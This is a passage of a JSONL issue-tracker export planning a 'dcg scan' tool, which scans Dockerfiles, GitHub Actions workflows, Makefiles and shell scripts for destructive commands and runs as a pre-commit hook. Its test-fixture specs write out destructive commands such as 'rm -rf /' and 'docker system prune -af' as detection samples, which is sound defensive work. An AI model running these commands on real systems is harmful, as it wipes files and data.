ignore common vendor dirs (`target/`, `node_modules/`, etc.) unless explicitly included\n\n### Output\n\n- Pretty format groups findings by file.\n- JSON format is a stable schema suitable for CI.\n\n### Error handling\n\n- Missing git repo / git failure should be a clear error for `--staged`/`--git-diff`.\n- Non-existent paths should be a clear error.\n- If extractor fails on a file, we should report an error finding but **not** crash.\n\n## Acceptance criteria\n\n- Running `dcg scan --paths scripts/e2e_test.sh --format json` produces valid JSON (even if no findings).\n- `dcg scan --staged` runs in a git repo and produces deterministic file order.\n- Unit tests exist for argument parsing and path filtering.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls (critical)\n- `dcg scan` must never be naive grep.\n- Only evaluate commands extracted from **executed contexts** (e.g., `run:` steps, Dockerfile `RUN`, Makefile recipes), not comments/docs.\n- Every extractor must ship with negative fixtures to prevent “dangerous substring in data” findings.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:49:10.881718777-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:26:50.996716979-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:55:59.364769611-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2","depends_on_id":"git_safety_guard-scan.1","type":"blocks","created_at":"2026-01-07T21:23:26.817595271-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.1","title":"scan: CLI args and command surface","description":"## Objective\n\nImplement the `dcg scan` CLI argument parsing and subcommand UX.\n\nThis task is about **CLI surface area and flag semantics**, not the extractor implementations.\n\n## Command selection modes (mutually exclusive)\n\n- `dcg scan --staged`\n- `dcg scan --paths \u003cpaths...\u003e`\n- `dcg scan --git-diff \u003crev-range\u003e`\n\n## Output / policy flags\n\n- `--format pretty|json`\n- `--fail-on error|warning|none`\n  - `error`: non-zero exit if any *error/deny* finding exists\n  - `warning`: non-zero exit if any warn/deny exists\n  - `none`: always exit 0\n\n## Safety / performance knobs\n\n- `--max-file-size \u003cbytes\u003e` (default conservative, e.g. 1MB)\n- `--max-findings \u003cn\u003e` (cap total findings)\n- `--exclude \u003cglob\u003e` (repeatable)\n- `--include \u003cglob\u003e` (repeatable; optional)\n- `--redact \u003cmode\u003e` (e.g., `none|quoted|aggressive`) and/or `--truncate \u003cn\u003e`\n\n## UX flags\n\n- `--verbose` (include skipped-file reasons, extractor stats)\n- `--top \u003cn\u003e` (limit printed exemplars in pretty output)\n\n## Error handling\n\n- Invalid flag combos produce actionable errors:\n  - cannot combine `--staged` and `--paths`\n  - cannot combine `--staged` and `--git-diff`\n  - missing `rev-range` for `--git-diff`\n\n## Acceptance criteria\n\n- `dcg scan --help` clearly explains modes and exit codes.\n- Invalid flag combos produce helpful errors.\n- Defaults are conservative (avoid scanning the world unintentionally).\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- CLI flags should make it easy to *reduce* noise:\n  - include/exclude globs\n  - max file size\n  - max findings\n  - fail-on severity threshold\n\n### Tests\n- Unit tests for:\n  - include/exclude interactions\n  - max-file-size behavior\n  - deterministic ordering of findings","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:03.443226256-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:27:02.510618629-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.1","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:28.383412499-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.2","title":"scan: git integration (staged + diff file lists)","description":"## Objective\n\nImplement file list discovery for:\n\n- staged files (`git diff --cached --name-only`)\n- diff ranges (`git diff --name-only \u003crev-range\u003e`)\n\n## Requirements\n\n- Deterministic ordering.\n- Clear errors when not in a git repo.\n- Path filtering and excludes are applied consistently.\n\n## Design notes\n\n### Prefer NUL-separated output\n\nTo correctly handle filenames with spaces/newlines, prefer `-z` forms:\n\n- staged: `git diff --cached --name-only -z`\n- diff range: `git diff --name-only -z \u003crev-range\u003e`\n\n### Deleted / renamed files\n\nScanning should only attempt to read files that exist in the selected content source:\n\n- For `--staged` scans, the *index* is the source of truth.\n- For `--git-diff` scans, the working tree is usually sufficient (CI), but we must not crash on deleted paths.\n\nImplementation should explicitly decide what to do with:\n\n- deleted files (skip)\n- renames (scan the new path)\n- submodules (skip)\n\n### Consistent filtering\n\nAll file lists must flow through one shared filter pipeline:\n\n- include globs\n- exclude globs\n- max file size\n- max files (optional)\n\n## Test plan\n\nCreate a small fixture repo in unit tests and cover:\n\n- staged add/modify\n- staged rename\n- staged delete (should not return deleted path)\n- filenames containing spaces\n- “not a git repo” (clear error)\n\n## Acceptance Criteria\n\n- `dcg scan --staged` returns a deterministic, de-duplicated list of staged file paths.\n- `dcg scan --git-diff \u003crev-range\u003e` returns a deterministic, de-duplicated list of changed file paths.\n- Deleted paths do not cause crashes or noisy errors; they are skipped with an optional debug log.\n- Filenames with spaces/newlines are handled correctly (use `-z` plumbing).\n- Filters (include/exclude/size) apply identically regardless of file list source.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive / noise controls\n- Correct file selection reduces false positives by ensuring we only scan the intended diff/staged surface.\n- Deleted paths and non-text files should be skipped deterministically (with optional debug log), not treated as scan failures.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:08.538495954-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:27:14.750699115-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.2","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:33.475014249-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.3","title":"scan: output formatting + fail-on policy","description":"## Objective\n\nImplement output formatting for scan results and the policy for failing (blocking) in CI/pre-commit.\n\nThis task defines the **stable JSON schema** and the **exit-code policy**.\n\n## Output formats\n\n### Pretty (human)\n\n- Group findings by file.\n- For each finding show:\n  - location (file:line[:col])\n  - extractor id\n  - decision (ALLOW/WARN/DENY)\n  - rule id (when matched)\n  - short reason\n  - truncated/redacted command preview\n- Include a summary footer:\n  - totals by decision/severity\n  - total files scanned / skipped\n  - elapsed time\n\n### JSON (machine)\n\nSchema requirements (v1):\n\n- `schema_version: 1`\n- `summary`:\n  - `files_scanned`, `files_skipped`\n  - `findings_total`\n  - counts by `decision`\n- `findings[]`:\n  - `file`, `line`, optional `col`\n  - `extractor_id`\n  - `extracted_command` (truncated/redacted)\n  - `decision`: allow|warn|deny\n  - `severity`: info|warning|error\n  - `rule_id` (when matched)\n  - `reason` (when matched)\n  - `suggestion?`\n\nDeterminism:\n\n- Findings are sorted deterministically:\n  1) `file` asc\n  2) `line` asc\n  3) `col` asc\n  4) `rule_id` asc (or extractor_id if no rule)\n\n## `--fail-on` policy\n\n- `none`: always exit 0\n- `warning`: exit non-zero if any `severity in {warning,error}` exists\n- `error`: exit non-zero only if any `severity == error` exists\n\n## Redaction / truncation\n\n- Default: truncate long commands.\n- `--redact` controls whether to redact quoted strings and other likely-secret spans.\n- Redaction must not break JSON schema.\n\n## Acceptance criteria\n\n- Exit codes match documented policy.\n- Outputs include rule id, severity, and reason when a match exists.\n- Output ordering is stable for snapshot/golden tests.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Output should make “executed vs data” obvious to reviewers (include extractor kind + extracted command snippet).\n- Redaction/truncation should avoid leaking secrets while still being debuggable.\n- `--fail-on` should default to high-confidence catastrophic rules only; warn-first for the rest.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:13.636737749-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:27:26.365781794-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:38.567223462-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-scan.2.1","type":"blocks","created_at":"2026-01-07T21:24:02.730946194-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-scan.2.2","type":"blocks","created_at":"2026-01-07T21:24:07.828229935-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T21:24:28.214491827-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:24:33.308987176-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-1gt.3","type":"blocks","created_at":"2026-01-07T22:22:33.951854137-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.3","depends_on_id":"git_safety_guard-1gt.3.2","type":"blocks","created_at":"2026-01-07T22:22:38.998889654-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.2.4","title":"scan: unit tests for CLI/path selection/output","description":"## Objective\n\nAdd unit/integration tests for `dcg scan` CLI parsing, file selection boundaries, and output stability.\n\n## Coverage goals\n\n### CLI parsing\n\n- mutual exclusion of `--staged`/`--paths`/`--git-diff`\n- defaults are conservative\n- help text includes exit code semantics\n\n### File selection\n\n- respects `--exclude` / `--include`\n- respects `--max-file-size`\n- deterministic ordering\n\n### Output correctness\n\n- JSON schema v1 fields exist (schema_version, summary, findings[])\n- deterministic ordering of findings\n- `--fail-on` exit code mapping is correct\n- redaction/truncation behavior is deterministic\n\n## Logging requirements\n\nOn failure, tests print:\n\n- the CLI invocation used\n- captured stdout/stderr (truncated)\n- parsed JSON diff vs expected (for json mode)\n\n## Acceptance criteria\n\n- Tests fail if we regress into extracting documentation strings.\n- Snapshot/golden tests remain stable across runs.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive coverage\nEnsure scan unit tests include explicit “must-not-find” cases:\n\n- dangerous substrings in comments\n- dangerous substrings in string literals / docs\n- safe commands in executed contexts","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:18.732314405-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:27:37.377896153-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2","type":"parent-child","created_at":"2026-01-07T21:16:43.658703242-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2.1","type":"blocks","created_at":"2026-01-07T21:24:12.924866928-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2.2","type":"blocks","created_at":"2026-01-07T21:24:18.01864202-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.2.4","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:24:23.11472507-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3","title":"Implement MVP extractors (shell, Dockerfile, GitHub Actions, Makefile)","description":"## Objective\n\nImplement the first set of conservative, high-signal extractors for `dcg scan`.\n\n## Guiding principle\n\nOnly extract **executable contexts**. Avoid extracting from fields that are obviously documentation.\n\nThis task should explicitly encode these boundaries so false positives don't explode.\n\n## MVP extractors\n\n### 1) Shell scripts (`*.sh`)\n\n- Extract candidate command lines from scripts.\n- Keep it conservative:\n  - ignore pure comments\n  - ignore blank lines\n  - treat each non-comment line as a candidate command line (we're not interpreting variables)\n- Long term improvement (not required for v1): handle multiline `\\` continuations.\n\n### 2) Dockerfile\n\n- Extract `RUN \u003cshell form\u003e` lines.\n- Ignore JSON-array exec-form `RUN [\"cmd\", ...]` for v1 unless we add a tiny parser.\n- Do NOT scan comments or `LABEL`/`ENV`/`ARG` values.\n\n### 3) GitHub Actions workflow YAML\n\n- Extract only `steps[].run` (string or block scalar).\n- Explicitly ignore:\n  - `name:` fields\n  - `env:` values\n  - `with:` values\n  - docs/comments\n\n### 4) Makefile\n\n- Extract recipe lines (tab-indented).\n- Handle `\\` continuation for adjacent recipe lines.\n- Ignore variable definitions and comments.\n\n## Output requirements\n\nEach extracted command must include:\n\n- `file`, `line`, optional `col`\n- `extractor_id`\n- the extracted command string\n\n## Tests\n\n- Unit tests per extractor with minimal fixtures:\n  - confirm *only* execution contexts are extracted\n  - confirm correct line numbers\n  - regression tests for common tricky cases (YAML block scalars, Makefile continuations)\n\n## Acceptance criteria\n\n- The extractors can be run on representative sample files without panicking.\n- Unit tests demonstrate the extractor boundaries (no docs strings).\n- Extracted commands are deterministic and stable for golden tests.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:49:26.918414721-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:49:26.918414721-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:04.621135514-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3","depends_on_id":"git_safety_guard-scan.1","type":"blocks","created_at":"2026-01-07T21:23:31.911198902-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.1","title":"scan extractor: shell scripts (.sh)","description":"## Objective\n\nExtract executable command contexts from shell scripts **conservatively**.\n\nShell scripts are noisy: many lines are assignments, control structures, or function definitions. A naive \"every non-comment line\" approach will create false positives.\n\n## Rules (v1)\n\n### 1) Ignore non-executable lines\n\nSkip lines that are clearly not command invocations, e.g.:\n\n- blank lines and pure comments\n- variable assignments at start of line:\n  - `FOO=bar`\n  - `export FOO=bar`\n- shell control keywords / structure:\n  - `if`, `then`, `elif`, `fi`, `for`, `while`, `until`, `do`, `done`, `case`, `esac`, `{`, `}`\n- function declarations:\n  - `foo() {`\n  - `function foo {`\n\n### 2) Extract only likely command lines\n\nFor remaining lines:\n\n- strip leading whitespace\n- treat the line as a candidate command line\n- do not attempt to evaluate variables\n\n### 3) Line continuations (minimal support)\n\n- If a line ends with `\\`, join with the next line for extraction purposes (bounded join length).\n\n### 4) Keyword prefilter (optional but recommended)\n\n- If the line does not contain any enabled-pack keyword, skip extraction early.\n  - This keeps extraction cheap and avoids scanning lots of irrelevant lines.\n\n## Acceptance criteria\n\n- Extracted commands include accurate line numbers (start line of a continued command).\n- No panics on unusual Unicode or long lines.\n- Does not extract obvious data-only assignments like `DOC=\"rm -rf\"`.\n\n## Tests\n\n- Fixtures must include negative cases:\n  - variable assignment containing dangerous substrings (must NOT extract)\n  - comments mentioning dangerous substrings (must NOT extract)\n  - control-structure lines (must NOT extract)\n- Positive cases:\n  - typical command lines (must extract)\n  - continued command lines (must extract and join)\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:16:54.946988626-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:26:43.653987975-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.1","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:23.667222661-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.2","title":"scan extractor: Dockerfile RUN (shell form)","description":"## Objective\n\nExtract executable shell commands from Dockerfile `RUN` instructions.\n\n## Rules (v1)\n\n- Extract `RUN \u003cshell form\u003e`.\n- Ignore JSON exec-form `RUN [\"cmd\", ...]` in v1 unless we add a tiny parser.\n- Ignore comments, labels, env, args.\n\n## Acceptance criteria\n\n- Correctly handles `RUN` with line continuations (`\\\\`).\n- Provides correct line number for the start of the RUN command.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Extract only Dockerfile `RUN` commands (shell form) and do not scan comments.\n- Treat here-doc style `RUN \u003c\u003cEOF` carefully (avoid double-scanning; use a single extractor path).\n\n### Tests\n- Positive fixture: `RUN rm -rf /` (deny)\n- Negative fixtures:\n  - `# RUN rm -rf /` (comment)\n  - `RUN echo \"rm -rf\"` (data-only mention)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:00.042137556-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:27:51.972817742-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.2","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:28.75720403-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.3","title":"scan extractor: GitHub Actions steps[].run","description":"## Objective\n\nExtract executable commands from GitHub Actions workflow YAML.\n\n## Rules (v1)\n\n- Extract only `steps[].run` values (string or block scalar).\n- Ignore `name`, `env`, `with`, docs fields.\n\n## Acceptance criteria\n\n- Correctly handles block scalar indentation.\n- Provides accurate line numbers.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Only extract from `steps[].run` (executed shell), not from:\n  - `name:` fields\n  - comments\n  - YAML strings that are not executed\n\n### Tests\n- Positive fixture: workflow step `run: docker system prune -af` (deny when docker pack enabled)\n- Negative fixtures:\n  - `name: \"rm -rf\"`\n  - comments containing dangerous strings","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:05.13809578-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:28:03.372680529-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.3","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:33.852553708-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.4","title":"scan extractor: Makefile recipe lines","description":"## Objective\n\nExtract executable recipe commands from Makefiles.\n\n## Rules (v1)\n\n- Extract tab-indented recipe lines.\n- Handle `\\\\` continuations within a recipe.\n- Ignore variable definitions and comments.\n\n## Acceptance criteria\n\n- Correctly identifies recipe boundaries.\n- Provides accurate line numbers.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Extract only recipe bodies (tab-indented command lines), not:\n  - variable assignments\n  - target names\n  - comments\n- Handle line continuations minimally and deterministically.\n\n### Tests\n- Positive fixture: a recipe line with `rm -rf /` (deny)\n- Negative fixtures:\n  - `VAR = rm -rf /` (assignment)\n  - `echo \"rm -rf\"` (data-only)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:10.229383509-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:28:15.495632924-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.4","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:38.948184716-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.3.5","title":"scan extractors: fixtures + unit tests","description":"## Objective\n\nCreate fixtures and unit tests for all MVP extractors.\n\n## Requirements\n\n- Small fixture files per extractor (checked into tests).\n- Tests assert:\n  - only executable contexts are extracted\n  - line numbers are correct\n  - extraction is deterministic\n\n## Critical false-positive guardrails\n\n- Tests must explicitly include \"dangerous substrings in data\" cases for each extractor:\n  - Shell: `FOO=\"rm -rf\"` (must NOT extract)\n  - GitHub Actions: `env: { X: \"rm -rf\" }` (must NOT extract)\n  - Dockerfile: `ENV X=\"rm -rf\"` (must NOT extract)\n  - Makefile: `VAR = rm -rf` (must NOT extract)\n\n## Acceptance criteria\n\n- Extractor tests fail if we start extracting documentation strings or data-only fields.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive regression set\nEnsure fixture suite includes explicit “do not flag” examples across file types:\n\n- dangerous strings in comments\n- dangerous strings in documentation fields (e.g., YAML `name:`)\n- dangerous strings inside quoted arguments to non-executing tools\n\nThis is what prevents org-wide adoption from being derailed by noisy PR checks.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:15.323965301-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:28:27.45626249-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3","type":"parent-child","created_at":"2026-01-07T21:17:44.040251051-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.1","type":"blocks","created_at":"2026-01-07T21:24:42.964281253-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.2","type":"blocks","created_at":"2026-01-07T21:24:48.062306771-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.3","type":"blocks","created_at":"2026-01-07T21:24:53.158858353-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.3.5","depends_on_id":"git_safety_guard-scan.3.4","type":"blocks","created_at":"2026-01-07T21:24:58.256989309-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4","title":"Pre-commit integration for dcg scan (staged)","description":"## Objective\n\nMake it easy for a team to adopt `dcg scan` locally by providing a first-class pre-commit integration path.\n\n## Background\n\n\"You should run dcg scan\" is not enough. Adoption happens when:\n\n- installation is one command\n- failures are actionable\n- teams can choose warn-first rollout\n\n## Proposed UX\n\n### The core command\n\n- `dcg scan --staged`\n\n### Installation helpers\n\nPick one (or more) pragmatic options:\n\n1. `dcg install-pre-commit` (writes `.git/hooks/pre-commit`)\n2. `dcg print-pre-commit-config` (prints snippets for popular managers)\n\nWe should not assume any specific manager.\n\n### Configuration\n\n- optionally read `.dcg/hooks.toml` for:\n  - scan globs\n  - excludes\n  - fail-on policy\n  - max sizes\n\n## Safety constraints\n\n- Default policy should be conservative:\n  - `fail_on = error` (high-confidence catastrophic rules)\n  - `warning` findings do not block commits by default\n\n## Tests\n\n- Unit test that the generated `.git/hooks/pre-commit` script is correct (string snapshot is fine).\n- E2E test (shell script) that runs `dcg scan --staged` on a small fixture repo and verifies expected behavior.\n\n## Acceptance criteria\n\n- A user can run one command and have pre-commit scanning enabled.\n- The hook can be installed idempotently.\n- Documentation exists in README or `dcg scan --help` output.\n","notes":"## Review Additions (2026-01-08)\n\n### False positive controls\n- Pre-commit must be warn-first by default (fail only on catastrophic rules) to avoid punishing developers for FP noise.\n- The hook should print actionable allowlist guidance (rule ID) so teams can converge on low-noise configs.","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:49:44.718141247-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:28:39.604823404-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4","depends_on_id":"git_safety_guard-scan","type":"parent-child","created_at":"2026-01-07T20:56:09.84683307-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4","depends_on_id":"git_safety_guard-scan.2","type":"blocks","created_at":"2026-01-07T21:23:37.005140608-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4","depends_on_id":"git_safety_guard-scan.3","type":"blocks","created_at":"2026-01-07T21:23:42.102394302-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.1","title":"pre-commit: install/uninstall helper (git hooks)","description":"## Objective\n\nImplement a helper command to install a pre-commit hook that runs `dcg scan --staged`.\n\n## Requirements\n\n- Idempotent install.\n- Clear messaging about bypass (`--no-verify`).\n- Support printing configs for hook managers (optional).\n\n## Design notes\n\n### Do not overwrite existing hooks silently\n\nPre-commit hooks are user-owned and often already exist.\n\nProposed behavior:\n\n- If `.git/hooks/pre-commit` does not exist: create a minimal hook that runs `dcg scan --staged`.\n- If it exists and was installed by `dcg` (detect via a sentinel comment): update in-place idempotently.\n- If it exists and is *not* a `dcg` hook: do **not** overwrite; instead print explicit instructions for manual integration.\n\n### Uninstall must be safe\n\n- Only uninstall if the hook contains the `dcg` sentinel.\n- Otherwise: refuse and explain (never delete/overwrite unknown user hooks).\n\n### Exit codes / messaging\n\n- The installed hook should:\n  - surface scan output\n  - fail the commit when `--fail-on` threshold is met\n  - mention bypass path (`git commit --no-verify`) but encourage allowlisting / fixing\n\n## Test plan\n\n- E2E test in a temp git repo:\n  - install when hook absent\n  - install again (idempotent)\n  - uninstall\n  - attempt uninstall when non-dcg hook exists (should refuse)\n\n## Acceptance Criteria\n\n- `dcg scan install-pre-commit` installs a working `.git/hooks/pre-commit` hook when none exists.\n- Running install twice is a no-op (idempotent) and never duplicates hook lines.\n- `dcg scan uninstall-pre-commit` removes only hooks it installed (sentinel-based) and refuses to touch other hooks.\n- Hook messaging is clear about:\n  - what failed\n  - how to fix/allowlist\n  - how to bypass (`--no-verify`) with explicit risk warning\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:17:55.636908818-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:53:58.511964208-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.1","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:19.453653841-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.1","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:25:10.086282153-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.1","depends_on_id":"git_safety_guard-scan.3.5","type":"blocks","created_at":"2026-01-07T21:25:15.185035321-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.2","title":"pre-commit: .dcg/hooks.toml config parsing","description":"## Objective\n\nSupport a project config file that controls `dcg scan` behavior for pre-commit usage.\n\nThis exists so teams can adopt scanning without requiring everyone to remember long CLI flag sets.\n\n## Proposed config file\n\n- Path: `.dcg/hooks.toml`\n- Scope: repository (committed, code-reviewed)\n\n## Config goals\n\n- Make rollout conservative and low-noise by default.\n- Provide a single place to encode:\n  - what to scan\n  - what to exclude\n  - how to redact\n  - when to fail\n\n## Suggested schema (v1)\n\n```toml\n[scan]\nfail_on = \"error\"           # error|warning|none\nformat = \"json\"             # pretty|json (pre-commit usually uses pretty)\nmax_file_size = 1000000\nmax_findings = 50\nredact = \"quoted\"           # none|quoted|aggressive\ntruncate = 200\n\n[scan.paths]\ninclude = [\"scripts/**\", \".github/workflows/**\", \"Dockerfile\", \"Makefile\"]\nexclude = [\"target/**\", \"node_modules/**\"]\n```\n\n## Validation behavior\n\n- Unknown keys produce warnings (do not crash hook).\n- Invalid values produce clear errors in `dcg scan` / `dcg doctor`.\n\n## Acceptance criteria\n\n- `dcg scan --staged` (pre-commit integration) can load `.dcg/hooks.toml` automatically.\n- CLI flags override config file values (explicit beats implicit).\n- Config parsing failures are actionable.\n\n## Tests\n\n- Golden tests for config parsing:\n  - valid config\n  - unknown keys warnings\n  - invalid enum values\n- Integration test: config affects include/exclude and redact behavior deterministically.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:00.729320573-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:30:33.206219139-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.2","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:24.545211146-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.2","depends_on_id":"git_safety_guard-scan.2.3","type":"blocks","created_at":"2026-01-07T21:25:20.281979873-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.2","depends_on_id":"git_safety_guard-scan.3.5","type":"blocks","created_at":"2026-01-07T21:25:25.375217044-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.3","title":"pre-commit: E2E fixture repo + detailed logging","description":"## Objective\n\nAdd an end-to-end test that:\n\n- creates a small fixture repo\n- stages files with known findings\n- runs `dcg scan --staged`\n- asserts output summary and exit code\n\nLogging must include per finding:\n\n- file:line\n- extracted command\n- rule id\n- reason\n\n## Design notes\n\n- The fixture repo should include at least:\n  - a safe file (no findings)\n  - a file with an executable destructive command in an executed context\n  - a file with a *data-only* mention of a destructive string (should not be flagged)\n- The test should assert both:\n  - correctness (findings exist where expected)\n  - ergonomics (output is actionable and stable)\n\n## Acceptance Criteria\n\n- Test creates a temp git repo, stages files, runs `dcg scan --staged`, and asserts:\n  - exit code matches `--fail-on` policy\n  - output contains stable rule IDs and file:line locations\n  - extracted commands are shown (redacted/truncated per policy)\n- Test includes at least one negative fixture ensuring data-only mentions do not produce findings.\n- Test output includes enough logging to debug failures without re-running locally.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:18:05.825341465-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:54:10.738525115-05:00","dependencies":[{"issue_id":"git_safety_guard-scan.4.3","depends_on_id":"git_safety_guard-scan.4","type":"parent-child","created_at":"2026-01-07T21:18:29.635035168-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.3","depends_on_id":"git_safety_guard-scan.4.1","type":"blocks","created_at":"2026-01-07T21:25:30.532356101-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-scan.4.3","depends_on_id":"git_safety_guard-scan.4.2","type":"blocks","created_at":"2026-01-07T21:25:35.79204859-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-scan.4.4","title":"pre-commit: docs + recommended rollout","description":"## Objective\n\nDocument how to adopt `dcg scan` in a pre-commit workflow **safely** (low-noise rollout that preserves developer/agent velocity).\n\n## Required doc sections\n\n### 1) What this is (and is not)\n\n- `dcg` hook protects *interactive execution*.\n- `dcg scan` protects repos by scanning *executable contexts* in files.\n- Emphasize: extractor-based scanning (NOT naive grep) to avoid false positives.\n\n### 2) Recommended rollout plan (warn-first)\n\n- Start with:\n  - narrow include set (workflows + Dockerfiles + Makefiles)\n  - `--fail-on error` only\n  - warnings informational for 1–2 weeks\n\n- Expand gradually:\n  - add `.sh` scripts\n  - add additional extractors (compose, Terraform, GitLab CI, package.json)\n\n### 3) How to interpret findings\n\n- Meaning of `decision` and `severity`.\n- How to read `rule_id` and why it is stable.\n\n### 4) How to fix a finding\n\n- Run `dcg explain \"...\"` for the extracted command.\n- Prefer changing code to safer alternatives.\n- If it is a false positive:\n  - use `dcg allow` / `dcg allowlist add ...` (project or user)\n  - 